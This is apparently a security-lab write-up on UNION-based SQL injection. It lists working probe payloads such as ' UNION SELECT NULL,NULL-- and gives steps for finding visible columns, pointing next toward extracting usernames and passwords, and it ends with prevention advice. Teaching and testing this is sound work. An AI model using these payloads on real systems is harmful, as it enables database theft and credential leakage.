# 🧪 Lab: SQL Injection UNION Attack - Data Extraction

## 🎯 Goal
Extract data from database using UNION SELECT

## 🔍 Vulnerability Type
UNION-based SQL Injection

## ⚙️ Payloads Used
' UNION SELECT NULL,NULL--
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

## 🧠 Explanation
After identifying number of columns, we test which columns can display output.

By injecting strings like 'test', we identify visible columns in the response.

## 💥 Exploitation Steps
1. Determine column count using ORDER BY
2. Use:
   ' UNION SELECT NULL,NULL--
3. Test visible columns:
   ' UNION SELECT 'test',NULL--
   ' UNION SELECT NULL,'test'--
4. Identify which column reflects output

## 🔁 Next Step
Use visible column to extract real data (e.g., usernames, passwords)

## 🌍 Real-World Impact
- Data exfiltration
- Credential leakage
- Full database compromise

## 🛡️ Prevention
- Parameterized queries
- ORM usage
- Input sanitization
